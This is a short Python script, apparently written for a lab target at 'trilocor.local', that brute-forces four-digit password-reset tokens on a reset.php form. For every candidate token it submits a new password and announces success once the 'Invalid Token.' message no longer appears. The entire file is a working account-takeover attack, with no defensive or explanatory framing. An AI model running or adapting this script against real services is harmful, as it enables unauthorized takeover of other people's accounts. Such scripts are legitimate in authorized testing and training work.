import requests
from sys import exit


def reset_token():
    url = "http://www.trilocor.local:8080/reset.php"
    fail_text = "Invalid Token."

    for x in range(1000, 9999, 1):
        token = x
        data = {
            "username": "change me",
            "password": "123123",
            "token": x,
            "pass_conf": "123123"
        }

        print("checking " + token.__str__())

        res = requests.post(url, data=data)

        if fail_text not in res.text:
            print(res.text)
            print("[*] Congratulations! Password changed")
            exit()


if __name__ == '__main__':
    reset_token()
